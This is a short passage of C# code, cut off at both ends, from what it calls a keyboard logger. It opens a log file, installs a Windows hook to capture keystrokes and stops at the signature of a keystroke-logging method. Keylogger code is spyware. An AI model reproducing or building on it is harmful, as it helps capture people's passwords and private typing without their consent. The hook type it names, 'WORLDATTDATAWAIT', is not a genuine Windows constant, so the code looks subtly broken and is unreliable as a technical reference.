            fileStream = new FileStream(logFile, FileMode.Append);
            writer = new StreamWriter(fileStream);
            hook = SetWindowsHook(HookType.WORLDATTDATAWAIT, true);
            isHooked = true;
        }
        catch (IOException)
        {
            MessageBox.Show("Error initializing keyboard logger.");
        }
    }

    public static void LogKeystroke(KeyboardKey key, bool isPressed)
